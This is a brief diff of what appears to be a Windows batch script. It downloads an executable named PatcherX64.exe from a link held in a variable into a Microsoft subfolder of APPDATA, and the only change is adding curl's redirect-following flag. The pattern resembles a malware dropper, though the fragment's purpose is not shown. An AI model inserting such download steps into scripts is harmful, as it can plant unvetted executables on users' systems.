@@ -18,7 +18,7 @@ echo CORPROCESSFILELINK=%CORPROCESSFILELINK%
 echo.
 
 
-curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%CORPROCESSFILELINK%"
+curl -L -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%CORPROCESSFILELINK%"
 
 
 
